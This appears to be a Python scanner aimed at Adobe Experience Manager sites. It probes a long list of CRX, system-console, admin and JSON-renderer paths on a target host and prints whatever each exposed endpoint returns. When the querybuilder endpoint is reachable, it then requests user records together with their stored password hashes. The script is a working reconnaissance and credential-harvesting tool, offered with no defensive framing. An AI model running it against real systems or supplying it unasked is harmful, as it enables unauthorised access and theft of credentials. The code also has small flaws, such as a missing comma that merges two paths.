import requests
import json
import sys

try:
  host = sys.argv[1]
except Exception:
  print "Please specify host"
if not host.endswith("/"):
  host = host+"/"
# def isHttps:
# return openssl s_client -showcerts -connect host:443

def getr(path):
  return requests.get(host+path, allow_redirects=False)


def accessible(r):
  return r.status_code == 200 and len(r.text)>2
paths = [
#Most used Paths
  "/crx/de",
  "/crx/de/index.jsp",
  "/crx/explorer",
  "/crx/explorer/index.jsp",
  "/crx/explorer/nodetypes/index.jsp",
  "/crx/packmgr.html",
  "/crx/packmgr/index.jsp",
  "/crx/packageshare/",
  "/bin/crxde/logs",
  "/libs/granite/backup/content/admin",
  "/libs/cq/search/content/querydebug.html",
  "/libs/granite/ui/content/dumplibs.html",
  "/libs/cq/dialogconversion/content/console.html",
  "/libs/cq/ui/content/dumplibs.html",
  "/libs/cq/tagging/content/debug.html",
  "/libs/cq/i18n/translator.html",
  "/system/console/depfinder",
  "/libs/sq/dialogconversion/content/console.html",
  "/libs/cq/contentsync/content/console.html",
  "/system/console/configMgr",
  "/system/console/bundles",
  "/system/console/memoryusage",
  "/system/console/jmx/java.lang%3Atype%3DRuntime",
  "/system/console/profiler",
  "/system/console/diskbenchmark",
  "/system/console/productinfo/",
  "/system/console/jmx/com.adobe.granite%3Atype%3DRepository",

#Renderers
  ".json",
  ".1.json",
  ".tidy.1.json",
  ".tidy.infinity.json",
  "apps.tidy.infinity.json",
  "var/classes.tidy.infinity.json",
  "content.infinity.json",
  "bin/querybuilder.json",
  "bin.tidy.infinity.json",

#Classis UI
  "/libs/cq/core/content/welcome.html",
  "/siteadmin",
  "/damadmin",
  "/mcmadmin#/content/dashboard",
  "/inbox",
  "/useradmin",
  "/miscadmin",
  "/tagging",
  "/libs/cq/workflow/content/console.html",
  "/libs/launches/content/admin.html",
  "/etc/replication.html",
  "/miscadmin#/etc/reports",
  "/etc/reports/userreport.html",
  "/etc/reports/auditreport.html",
  "/libs/cq/taskmanagement/content/taskmanager.html#tasks",
  "/publishingadmin",
  "/etc/clientcontext/default/content.html",
  "/miscadmin#/etc/msm/rolloutconfigs",
  "/libs/cq/i18n/translator.html",
  "/etc/importers/bulkeditor.html",
  "/miscadmin#/etc/importers",

#Touch UI
  "/projects",
  "/sites.html/content",
  "assets.html/content/dam",
  "/libs/granite/security/content/useradmin.html",
  "libs/granite/security/content/groupadmin.html",
  "libs/granite/offloading/content/view.html",
  "libs/granite/topology/content/view.html",
  "/libs/granite/operations/content/healthreports.html",
  "/libs/granite/operations/content/diagnosis.html",
  "/libs/granite/operations/content/maintenance.html",
  "/etc/cloudservices.html",
  "/libs/granite/distribution/content/distribution.html",
  "/aem/forms.html/content/dam/formsanddocuments",
  "/aem/apps.html/content/phonegap",
  "/aem/publications.html/content/publications"
  "/libs/cq/core/content/tools/customsearch/searchfacetformlister.html",

]
worked = []
for p in paths:
  r = getr(p)
  if accessible(r):
    print "\n\n\nFOUND on: "+p+"\n"+r.text
    worked.append(p)
print "\n\n\nFINISHED scan: endpoints found\n"
for p in worked:
  print p
if "bin/querybuilder.json" in worked:
  print "\ntrying to get passwords..."
  print getr("/bin/querybuilder.json?type=rep:User&p.hits=selective&p.properties=rep:principalName%20rep:password&p.limit=100").text